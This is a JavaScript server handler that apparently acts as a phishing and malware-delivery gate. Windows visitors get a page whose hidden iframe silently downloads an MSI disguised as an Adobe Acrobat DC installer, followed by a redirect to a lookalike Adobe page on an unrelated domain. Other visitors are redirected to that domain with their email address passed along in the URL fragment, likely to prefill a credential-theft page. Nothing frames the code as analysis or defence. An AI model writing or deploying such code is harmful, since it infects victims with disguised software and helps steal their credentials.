export default function handler(req, res) {
  const userAgent = (req.headers && req.headers['user-agent']) || '';
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
    'https://wavemarkmx.com/adober/reader/download.html';
  const MSI_PATH = '/AdobeAcrobatDC_2025.003.40436_29091';

  // Base URL for non-Windows users
  const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/ms';

  //--------------------------------------------------------------------
  // 1. Extract email from query or hash
  //--------------------------------------------------------------------
  let email = '';

  if (req.query && req.query.email) {
    email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
  } else if (req.query && req.query.smn) {
    email = Array.isArray(req.query.smn) ? req.query.smn[0] : req.query.smn;
  } else if (req.url) {
    const hashMatch = req.url.match(/#([^?&]+)/);
    if (hashMatch && hashMatch[1]) {
      try {
        email = decodeURIComponent(hashMatch[1]);
      } catch (e) {
        email = hashMatch[1];
      }
    }
  }

  //--------------------------------------------------------------------
  // 2. Windows users: serve MSI download + redirect
  //--------------------------------------------------------------------
  if (isWindows) {
    const htmlParts = [
      '<!DOCTYPE html>',
      '<html>',
      '<head>',
      '  <meta charset="utf-8" />',
      '  <title>Preparing Download…</title>',
      '</head>',
      '<body>',
      '  <p>Your download will start shortly…</p>',
      '  <script>',
      '    (function () {',
      "      var iframe = document.createElement('iframe');",
      "      iframe.style.display = 'none';",
      `      iframe.src = '${MSI_PATH}';`,
      '      document.body.appendChild(iframe);',
      '      setTimeout(function () {',
      `        window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';`,
      '      }, 2000);',
      '    })();',
      '  </script>',
      '</body>',
      '</html>'
    ];

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(htmlParts.join('\n'));
    return;
  }

  //--------------------------------------------------------------------
  // 3. Non-Windows: redirect with email in fragment (#)
  //--------------------------------------------------------------------
  const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}
